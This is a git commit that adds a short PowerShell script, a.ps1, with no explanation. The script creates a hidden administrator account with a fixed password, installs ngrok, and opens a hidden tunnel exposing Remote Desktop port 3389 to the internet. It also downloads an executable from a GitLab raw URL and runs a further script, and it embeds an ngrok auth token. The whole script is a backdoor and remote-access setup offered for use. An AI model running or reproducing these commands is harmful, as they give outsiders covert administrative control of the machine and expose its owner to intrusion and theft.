41292c5f4e89870c304725322400c2627a97d0bd
Efebey2903 <swatibaljeet0101@gmail.com>
2024-06-10 21:18:39 +0300

    Add files via upload

---
+++ a.ps1
@@ -0,0 +1,10 @@
+cmd /c net user /add Admin P@ssw0rd! 
+cmd /c net localgroup administrators /add Admin
+choco install ngrok -y
+ngrok config add-authtoken 2dumqfNwOrYeLZWxq5jCHAJvnq2_3SSomQfvvbASdUDZiQMT
+Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
+sleep 240
+curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+.\0.ps1
+curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+.\0.ps1
